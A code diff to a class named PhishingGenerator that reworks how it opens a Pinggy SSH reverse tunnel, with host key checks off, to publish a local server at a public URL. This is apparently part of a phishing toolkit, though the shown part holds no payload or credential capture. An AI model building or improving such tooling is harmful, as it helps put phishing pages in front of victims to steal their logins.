@@ -836,13 +836,13 @@ class PhishingGenerator:
         self._save_session_key('tunnel_type', self.tunnel_type)
 
     def _start_pinggy(self):
-        import re
+        import re, select
         addr = str(self.server_port)
         console.print(f"[cyan]⟳ Starting Pinggy tunnel on port {addr}...[/]")
         console.print("[dim]🌐 Pinggy provides HTTP/HTTPS URLs accessible from any browser[/]")
         try:
             self.tunnel_process = subprocess.Popen(
-                ["ssh", "-N", "-T", "-p", "443", "-R", f"0:localhost:{addr}",
+                ["ssh", "-p", "443", "-R", f"0:localhost:{addr}",
                  "-o", "StrictHostKeyChecking=no",
                  "-o", "UserKnownHostsFile=/dev/null",
                  "-o", "ServerAliveInterval=30",
@@ -850,7 +850,7 @@ class PhishingGenerator:
                  "-o", "ExitOnForwardFailure=yes",
                  "-o", "BatchMode=yes",
                  "-o", "PasswordAuthentication=no",
-                 "-o", "LogLevel=ERROR",
+                 "-o", "ConnectTimeout=15",
                  "free.pinggy.io"],
                 stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, bufsize=1
             )
@@ -859,14 +859,16 @@ class PhishingGenerator:
             start = time.time()
             while time.time() - start < 30:
                 try:
+                    r, _, _ = select.select([self.tunnel_process.stdout], [], [], 0.5)
+                    if not r:
+                        continue
                     line = self.tunnel_process.stdout.readline()
                     if not line:
-                        time.sleep(0.2)
                         continue
                     line = line.strip()
                     if line:
                         output_log.append(line)
-                    urls = re.findall(r'https?://[a-z0-9][-a-z0-9\.]*[a-z0-9](?::\d+)?(?:/[^\s\'\"<>]*)?', line)
+                    urls = re.findall(r'https?://[a-z0-9][-a-z0-9\.]*(?::\d+)?(?:/[^\s\'\"<>]*)?', line)
                     for u in urls:
                         u = u.rstrip('/.')
                         if 'pinggy' in u:
@@ -878,7 +880,7 @@ class PhishingGenerator:
                     break
             if not url:
                 for line in output_log:
-                    urls = re.findall(r'https?://[a-z0-9][-a-z0-9\.]*[a-z0-9](?::\d+)?(?:/[^\s\'\"<>]*)?', line)
+                    urls = re.findall(r'https?://[a-z0-9][-a-z0-9\.]*(?::\d+)?(?:/[^\s\'\"<>]*)?', line)
                     for u in urls:
                         u = u.rstrip('/.')
                         if 'pinggy' in u:
